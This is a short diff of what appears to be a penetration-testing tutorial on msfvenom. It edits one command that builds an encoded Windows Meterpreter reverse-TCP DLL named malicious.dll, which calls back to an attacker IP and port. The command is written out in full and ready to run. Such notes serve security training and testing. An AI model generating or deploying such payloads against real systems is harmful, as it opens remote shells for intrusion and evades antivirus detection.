@@ -59,7 +59,7 @@ The -b flag is meant to be used to avoid certain characters in the payload. When
 This command uses `msfvenom` to create a DLL payload that establishes a reverse TCP connection to the specified attacker's IP and port.
 
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.6 LPORT=4444 -f dll -e x64/shikata_ga_nai -i 5 -o malicious.dll
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.6 LPORT=4444 -f dll -e x86/shikata_ga_nai -i 5 -o malicious.dll
 ```
 
 # How to generate a payload
